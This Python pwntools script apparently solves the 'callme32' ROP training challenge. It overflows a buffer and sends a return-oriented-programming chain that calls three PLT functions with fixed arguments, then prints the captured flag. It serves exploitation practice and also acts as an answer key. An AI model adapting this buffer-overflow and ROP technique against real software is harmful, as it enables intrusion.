#!/usr/bin/python
from pwn import *
import struct

elf = ELF('callme32')

pad = 'A'*44
ropchain  = struct.pack('<L', 0x080485c6) # 0x080485c6  GLOBAL    FUNC callme_one@plt+6
ropchain += struct.pack('<L', 0x080488a9) # 0x080488a9: pop esi; pop edi; pop ebp; ret;  
ropchain += struct.pack('<L', 0x1)
ropchain += struct.pack('<L', 0x2)
ropchain += struct.pack('<L', 0x3)
ropchain += struct.pack('<L', 0x08048626) # 0x08048626  GLOBAL    FUNC callme_two@plt+6
ropchain += struct.pack('<L', 0x080488a9) # 0x080488a9: pop esi; pop edi; pop ebp; ret;
ropchain += struct.pack('<L', 0x1)
ropchain += struct.pack('<L', 0x2)
ropchain += struct.pack('<L', 0x3)
ropchain += struct.pack('<L', 0x080485b6) # 0x080485b6  GLOBAL    FUNC callme_three@plt+6
ropchain += struct.pack('<L', 0x080488a9) # 0x080488a9: pop esi; pop edi; pop ebp; ret;
ropchain += struct.pack('<L', 0x1)
ropchain += struct.pack('<L', 0x2)
ropchain += struct.pack('<L', 0x3)
exploit = pad + ropchain

io = process(elf.path)
io.recv()
io.sendline(exploit)

flag = io.recv()
success(flag)
